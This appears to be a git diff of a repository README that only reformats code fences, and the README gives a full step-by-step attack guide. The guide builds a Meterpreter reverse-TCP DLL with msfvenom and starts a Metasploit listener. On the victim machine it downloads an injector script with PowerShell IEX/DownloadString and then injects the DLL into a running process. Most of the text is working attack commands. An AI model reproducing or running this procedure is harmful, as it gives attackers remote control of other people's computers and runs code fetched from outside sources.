@@ -16,7 +16,7 @@ It consists in a DLL injection of a malicious DLL containing a payload from Meta
 
 Open Kali Linux terminal and type the following command:
 
-```http
+```
   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<SOME_PORT> -f dll > <OUTPUT_PATH> 
 ```
 
@@ -24,36 +24,36 @@ Once the DLL is created in the output path specified, copy it to a USB storage d
 
 After that, we need to setup the listener. Firstly, open the Metasploit Framwork console by typing the command:
 
-```http
+```
   msfconsole
 ```
 Once it opens, select usage of "exploit/multi/handler" module:
 
-```http
+```
   use exploit/multi/handler
 ```
 
 Then, set the payload used to create the DLL file:
 
-```http
+```
   set payload windows/x64/meterpreter/reverse_tcp
 ```
 
 Now set your IP:
 
-```http
+```
   set lhost <YOUR_IP>
 ```
 
 And the port specified previously:
 
-```http
+```
   set lport <SOME_PORT>
 ```
 
 Finally to start listening just execute:
 
-```http
+```
   exploit
 ```
 
@@ -67,25 +67,25 @@ Insert the USB storage device and open Powershell.
 
 Now run the command below, select a process where you will inject the DLL and anotate its pid.
 
-```http
+```
   ps
 ```
 
 After that, enable TLS 1.2 with the command:
 
-```http
+```
   [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 ```
 
 Download the injector provided in this repository:
 
-```http
+```
   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GVO72/SSR_FP/main/Invoke-DllInjection.ps1')
 ```
 
 And finally inject the malicious DLL with the command:
 
-```http
+```
   Invoke-DllInjection -ProcessID <selected_pid> -Dll <path_of_the_dll>
 ```
 
